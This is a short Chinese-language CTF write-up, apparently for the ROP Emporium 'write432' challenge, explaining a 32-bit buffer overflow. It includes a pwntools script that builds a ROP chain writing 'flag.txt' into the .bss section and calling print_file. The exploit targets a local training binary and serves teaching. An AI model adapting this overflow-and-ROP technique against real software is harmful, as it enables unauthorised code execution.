# write432

> 我们需要执行print_file("flag.txt")，32位要用栈传递参数。

1. 把bss的首地址弹到%edi，把'flag'弹到%ebp，然后把%ebp（'flag'）传递给%edi所指向的地址，即bss的首地址。

2. 同理，把bss+4的地址弹到%edi，把'.txt'弹到%ebp，然后把%ebp（'.txt'）传递给%edi所指向的地址，即bss+4。

3. 同理，把bss+8的地址弹到%edi，把'\0'弹到%ebp，然后把%ebp（'\0'）传递给%edi所指向的地址，即bss+8。

4. 最后，调用print_file()，参数地址设置在bss段首地址。

Exp:
```python
import pwn
  
pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./write432')
e = pwn.ELF('./write432')
libwrite432 = pwn.ELF('./libwrite432.so')

print_file_plt = pwn.p32(e.plt['print_file'])
bss_addr = e.bss()                          # bss段的首地址
pop_edi_ebp_addr = pwn.p32(0x080485aa)        # pop edi ; pop ebp ; ret
mov_ebp__edi__addr = pwn.p32(0x08048543)      # mov %ebp (%edi) ; ret 

'''
for k, v in e.sym.items():
    print(k, hex(v))
'''

# pwn.gdb.attach(p)

payload = b'A' * 0x28 + b'B' * 4 + pop_edi_ebp_addr + pwn.p32(bss_addr) + b'flag' + mov_ebp__edi__addr  
#                                           #  pop bss_addr to edi  | pop 'flag' to ebp  | mov 'flag' to (%edi) -> bss_addr
payload += pop_edi_ebp_addr + pwn.p32(bss_addr + 4) + b'.txt' + mov_ebp__edi__addr
#                           #  pop bss+4 to edi  | pop '.txt' to ebp  | mov '.txt' to (%edi) -> bss+4
payload += pop_edi_ebp_addr + pwn.p32(bss_addr + 8) + pwn.p32(0) + mov_ebp__edi__addr
#                           #  pop bss+8 to edi  | pop '\0' to ebp  | mov '\0' to (%edi) -> bss+8
payload += print_file_plt + b'RRRR' + pwn.p32(bss_addr)                                                 
#                                #  bss_addr = 'flag.txt\0'
p.sendlineafter(b'> ', payload)
p.recv()
```